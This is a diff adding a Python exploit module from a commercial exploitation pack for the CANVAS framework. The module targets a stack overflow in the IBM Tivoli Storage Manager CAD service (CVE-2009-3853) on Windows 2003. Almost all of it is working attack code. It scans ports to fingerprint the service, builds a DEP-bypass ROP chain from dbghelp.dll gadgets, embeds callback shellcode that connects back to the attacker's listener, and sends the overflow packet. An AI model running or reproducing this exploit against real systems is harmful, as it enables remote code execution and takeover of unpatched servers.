@@ -1,0 +1,193 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+
+# GUI info
+NAME = "IBM Tivoli Storage Manager CAD Service Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in IBM Tivoli Storage Manager CAD Service"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "IBM"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2009.04.11"
+DOCUMENTATION["References"] = "http://secunia.com/secunia_research/2008-51/"
+DOCUMENTATION["Versions Affected"] = "TSM 5.3 < 5.3.6.7, 5.4 < 5.4.3, 5.5 < 5.5.2.2, 6.1 < 6.1.0.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-3853"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3853"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2003 SP2 US / TSM 5.4 (DEP)", 0x77be0c32 ], # mov esp, ebx  
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 0
+        self.ssl = 0
+        self.version = 0
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)                  
+
+
+    def getport(self):			
+			for i in range(1025, 1225):
+				self.log("Port %d" % i)
+								
+				s = self.gettcpsock()
+				s.set_timeout(0.5)												
+							
+				try:
+					s.connect((self.host, i))					                        
+				except:
+					s.close()
+					continue       
+							
+				s.set_timeout(5)
+				data = "\x00\x00\x08\xa5" + "\x00\x01\x02\x00" + "\x00\x00\x00\x1e" + "\x00\x01" + "\x00"*16
+				s.send(data)				      
+				buff = s.recv(1024)
+				
+				if "\x00\x00\x08\xA5\x00\x01\x03\x00" in buff:	
+					self.log("Port %d => Tivoli Storage Manager CAD detected" % i)					
+					return i			
+				else:
+					self.log("Port %d => Tivoli Storage Manager CAD not detected" % i)
+								
+				s.close()
+				
+			self.log("Tivoli Storage Manager CAD not detected")
+			return 0
+
+
+    def run(self):
+        # Check arguments
+        self.host = self.target.interface                
+        self.port = int(self.argsDict.get("port", self.port))
+        
+        if (self.port == 0):
+        	self.port = self.getport()	
+
+        if (self.port == 0):
+        	return 0	
+                
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        s.send(sploitstring)        
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):				
+    	os_name, eip = targets[self.version]
+    	ret = struct.pack('<L', eip)
+			
+    	# anti-dep
+    	inst1 = struct.pack('<L', 0x0284d7f2) # pop eax @ dbghelp.dll
+    	inst2 = struct.pack('<L', 0x0284dcef) # pop ecx @ dbghelp.dll
+    	inst3 = struct.pack('<L', 0x0284daae) # call dword ptr [ecx] @ dbghelp.dll			
+    	inst4 = struct.pack('<L', 0x02874090) # add esp, 20	@ dbghelp.dll	
+    	inst5 = struct.pack('<L', 0x0289fbe3) # call esp @ dbghelp.dll
+			
+    	# ZwSetInformationProcess(-1, 22, 2, 4) 
+    	val1 = struct.pack('<L', 0xed)       # eax == 0xed
+    	val2 = struct.pack('<L', 0x7ffe0300) # edx == 0x7ffe0300								
+    	val3 = struct.pack('<L', 0xffffffff)
+    	val4 = struct.pack('<L', 0x22)
+    	val5 = struct.pack('<L', 0x7ffe0270) # 2
+    	val6 = struct.pack('<L', 0x4)			    	
+											
+    	dep = "\xff\xff\xff\xff" + inst2 + val2 + inst1 + val1 + inst3 + inst4 + val3 + val4 + val5 + val6 + "\x90"*16 + inst5
+    	data = "\x90"*(0x430-len(dep))
+    	sc = data[0:12]
+    	sc += self.shellcode
+    	sc += data[12 + len(self.shellcode):]	
+									
+    	info = "A"*0x8004 + dep + sc + ret + "C" * 0x7000    	
+    	datalen = struct.pack(">H", len(info)+4)			    	
+    	sploitstring = datalen + "\x26\xa5" + info
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
